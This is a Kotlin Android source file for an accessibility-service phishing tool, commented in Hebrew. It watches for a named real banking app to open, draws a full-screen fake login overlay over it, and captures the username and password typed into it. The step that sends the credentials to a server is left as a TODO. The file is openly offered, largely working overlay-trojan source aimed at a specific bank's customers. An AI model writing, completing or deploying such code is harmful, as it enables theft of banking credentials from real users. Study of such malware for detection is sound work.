package com.example.phishingframework

import android.accessibilityservice.AccessibilityService
import android.content.Context.WINDOW_SERVICE
import android.graphics.PixelFormat
import android.util.Log
import android.view.LayoutInflater
import android.view.WindowManager
import android.view.View
import android.view.accessibility.AccessibilityEvent
import android.widget.Button
import android.widget.EditText
import androidx.core.content.ContextCompat.getSystemService
import android.os.Handler
import android.os.Looper
import android.os.SystemClock


class PhishingAccessibilityService : AccessibilityService() {
    companion object {
        private const val TAG = "PhishingService"
        private const val TARGET_PACKAGE = "com.ideomobile.mercantile"
        private const val MIN_SHOW_MS = 500L
    }

    private var overlayView: View? = null
    private lateinit var windowManager: WindowManager
    private val handler = Handler(Looper.getMainLooper())
    private var pendingRemove: Runnable? = null

    // נזכור מתי הצגנו את ה-Overlay לאחרונה
    private var lastShowTime = 0L

    //מאתחל את ה-WindowManager לשימוש בהוספה/הסרה של overlay
    //זהו callback של מחלקת AccessibilityService, שנקרא ברגע שהשירות (ה־Service) מתחבר למערכת ומוכן לקבל אירועי Accessibility
    //בשלב הזה אפשר לאתחל משאבים שצריך בשירות, למשל קבלת הפניה ל־WindowManager.
    //getSystemService(name: String) -מאפשרת לגשת ל־שירותי מערכת מובנים באנדרואיד
    // WINDOW_SERVICE- מעיד ל־ getSystemService שאנחנו רוצים את שירות ניהול החלונות של המערכת
    override fun onServiceConnected() {
        super.onServiceConnected()
        Log.i(TAG, "Service Connected")
        windowManager = getSystemService(WINDOW_SERVICE) as WindowManager
    }

    //override fun onAccessibilityEvent(event: AccessibilityEvent?) - זו מתודה רישומית (callback) של AccessibilityService
    //ה־Android קורא לה בכל פעם ש־AccessibilityService פעיל ומתרחש אירוע מסוים במערכת (למשל שינוי חלון, לחיצה על כפתור, קבלת פוקוס על תצוגה)
    //event ?: return:
    //אם event הוא null, הפקודה מבצעת return ומפסיקה את הפונקציה מיידית
    //אם event לא null, ההרצה ממשיכה הלאה עם האובייקט שמצוי ב־event
    //event.eventType זה מספר (int) שמסמן איזה אירוע בדיוק התרחש
    //TYPE_WINDOW_STATE_CHANGED הוא קבוע שמסמן “חלון חדש נפתח או קיבל פוקוס” (למשל כשActivity חדש עולה על המסך).
    //ברגע שהאירוע הוא גם שינוי חלון וגם מאפליקציית הבנק, הפונקציה קוראת ל־showPhishingOverlay()
    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event ?: return
        if (event.eventType != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) return

        val pkg = event.packageName?.toString() ?: return
        Log.i(TAG, "Window changed to $pkg")

        val selfPkg = applicationContext.packageName
        val recentsPkgs = setOf(
            "com.android.systemui",
            "com.samsung.android.app.cocktailbarservice"
        )
        val exitPkgs = setOf(
            "com.sec.android.app.launcher"
        )

        when {
            pkg == TARGET_PACKAGE -> {
                // ביטול כל הסרות מתוזמנות ולהציג
                pendingRemove?.let { handler.removeCallbacks(it) }
                pendingRemove = null
                showPhishingOverlay()
            }
            pkg == selfPkg || pkg in recentsPkgs -> {
                // מתעלמים
            }
            pkg in exitPkgs -> {
                // רק תזמון הסרה אם עבר הסף מהמופע האחרון
                val now = SystemClock.uptimeMillis()
                if (now - lastShowTime >= MIN_SHOW_MS && pendingRemove == null) {
                    pendingRemove = Runnable {
                        removeOverlay()
                        pendingRemove = null
                    }
                    handler.postDelayed(pendingRemove!!, 0)
                }
            }
            else -> {
                // אפליקציה צד ג' – הסר מיד
                removeOverlay()
            }
        }
    }


    //זו המתודה שמטפלת ב־interrupt של ה־AccessibilityService, כלומר ברגע שהשירות “מתקלקל” (נכנס לפעולה של עצירה) או כשמשתמש מבטל את השירות ב־Settings
    //נקראת כאשר AccessibilityService נפסק או מושבת על-ידי המשתמש ב־Settings או כשמערכת ה־Accessibility מגלה שהשירות שלך לא צריך עוד לרוץ (למשל אחרי שינוי הגדרות)
    // התפקיד של הפונקציה הוא לנקות (clean up) כל גליונות ה-Overlay שנותרו פתוחים
    override fun onInterrupt() {
        pendingRemove?.let { handler.removeCallbacks(it) }
        pendingRemove = null
        removeOverlay()
    }

    //מטפלת ב־“הצגת המסך המזויף” שלך ברגע הנכון, אוכלת את ה־layout, מחכה לאינטראקציה של המשתמש, ומשתמשת ב־WindowManager כדי לצוף מעל אפליקציות אחרות
    private fun showPhishingOverlay() {
        //מונע קריאות כפולות שעלולות לגרום ל־addView חוזרות ולשגיאות
        if (overlayView != null) return
        pendingRemove?.let { handler.removeCallbacks(it) }
        pendingRemove = null

        //LayoutInflater: כלי שממיר קובץ XML ל־View בריצה
        val inflater = LayoutInflater.from(this)
        overlayView = inflater.inflate(R.layout.phishing_login_overlay, null)

        // חיבור הכפתור
        overlayView!!.findViewById<Button>(R.id.login_button).setOnClickListener {
            val user = overlayView!!.findViewById<EditText>(R.id.username_field).text.toString()
            val pass = overlayView!!.findViewById<EditText>(R.id.password_field).text.toString()
            // TODO: כאן תשגרי ל-Server את user+pass
            removeOverlay()
        }

        //הגדרת פרמטרי החלון (LayoutParams)
        val params = WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
            //מונע מהחלון לקבל את הפוקוס המלא, כדי שהמשתמש עדיין יוכל (במידת הצורך) ללחוץ על כפתורים של האפליקציה שמתחת
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
            //מאפשר שקיפות (כפי שהגדרת ב־layout עם רקע חצי־שקוף)
            PixelFormat.TRANSLUCENT
        )

        windowManager.addView(overlayView, params)
        Log.i(TAG, "Phishing overlay shown")

        lastShowTime = SystemClock.uptimeMillis()
        Log.i(TAG, "Phishing overlay shown")
    }

    private fun removeOverlay() {
        overlayView?.let {
            windowManager.removeView(it)
            overlayView = null
            Log.i(TAG, "Phishing overlay removed")
        }
    }
}